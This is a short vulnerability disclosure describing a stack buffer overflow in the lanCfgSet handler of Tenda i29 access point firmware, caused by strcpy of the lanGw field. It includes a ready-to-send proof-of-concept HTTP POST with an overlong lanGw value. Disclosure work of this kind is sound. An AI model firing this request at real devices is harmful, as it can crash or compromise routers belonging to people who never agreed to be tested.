# Tenda i29  Buffer overflow vulnerability

## Firmware information

Firmware download address ：https://www.tendacn.com/download/detail-4916.html

## Affected version

Tenda i29 v1.0 V1.0.0.5

Tenda i29 v1.0 V1.0.0.2
## Vulnerability details
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231211001936.png)

In the `lanCfgSet` function, a stack overflow may occur when the value of parameter `v8` is excessively large and is passed to the `lanGw` parameter in the `strcpy` function.
## Poc

```http
POST /goform/modules HTTP/1.1
Host: 192.168.0.254
Content-Length: 214
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json
Origin: http://192.168.0.254
Referer: http://192.168.0.254/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _:USERNAME:_=admin
Connection: close

{"lanCfgSet":{"lanMac":"08:40:F3:D1:25:90","lanType":"static","lanIp":"192.168.0.254","lanMask":"255.255.255.0","lanGw":"0.0.0.01111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111","preDns":"0.0.0.0","altDns":"0.0.0.0","deviceName":"Access Point","ethMode":"auto"}}
```

## Author

E4L4@TalentSec Co.,Ltd